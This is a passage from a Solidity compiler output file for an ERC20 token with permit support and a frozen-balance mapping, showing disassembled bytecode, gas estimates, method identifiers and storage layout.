0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x507 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x622 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x658 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x6A9 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x6B4 DUP10 DUP10 DUP10 PUSH2 0x6DC JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x7B7 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x7EC SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x848 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0x385 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 STOP 0xD3 LOG0 PUSH19 0xE2B19D1942FD6FF86893A1396BBA021B0FB095 DUP12 0xE6 SELFDESTRUCT GASPRICE LT 0xDA 0x49 0xB7 0xD4 PUSH5 0x736F6C6343 STOP SDIV LT STOP ORIGIN GASLIMIT 0x49 POP CALLDATACOPY BALANCE ORIGIN DIFFICULTY PUSH16 0x6D61696E28737472696E67206E616D65 0x2C PUSH20 0x7472696E672076657273696F6E2C75696E743235 CALLDATASIZE KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "450400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"DOMAIN_SEPARATOR()": "1087",
						"PERMIT_TYPEHASH()": "243",
						"_frozenBalance(address)": "1147",
						"allowance(address,address)": "1305",
						"approve(address,uint256)": "22366",
						"balanceOf(address)": "1169",
						"decimals()": "274",
						"name()": "infinite",
						"nonces(address)": "1191",
						"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
						"symbol()": "infinite",
						"totalSupply()": "1066",
						"transfer(address,uint256)": "infinite",
						"transferFrom(address,address,uint256)": "infinite"
					},
					"internal": {
						"_approve(address,address,uint256)": "infinite",
						"_burn(address,uint256)": "infinite",
						"_mint(address,uint256)": "infinite",
						"_transfer(address,address,uint256)": "infinite",
						"freezeMint(address,uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"DOMAIN_SEPARATOR()": "3644e515",
					"PERMIT_TYPEHASH()": "30adf81f",
					"_frozenBalance(address)": "47d5d856",
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"decimals()": "313ce567",
					"name()": "06fdde03",
					"nonces(address)": "7ecebe00",
					"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
					"symbol()": "95d89b41",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 19,
						"contract": "ERC20.sol:ERC20",
						"label": "totalSupply",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 23,
						"contract": "ERC20.sol:ERC20",
						"label": "balanceOf",
						"offset": 0,
						"slot": "1",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 29,
						"contract": "ERC20.sol:ERC20",
						"label": "allowance",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 33,
						"contract": "ERC20.sol:ERC20",
						"label": "_frozenBalance",
						"offset": 0,
						"slot": "3",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 35,
						"contract": "ERC20.sol:ERC20",
						"label": "DOMAIN_SEPARATOR",
						"offset": 0,
						"slot": "4",
						"type": "t_bytes32"
					},
					{
						"astId": 42,
						"contract": "ERC20.sol:ERC20",
						"label": "nonces",
						"offset": 0,
						"slot": "5",
						"type": "t_mapping(t_address,t_uint256)"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bytes32": {
						"encoding": "inplace",
						"label": "bytes32",
						"numberOfBytes": "32"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}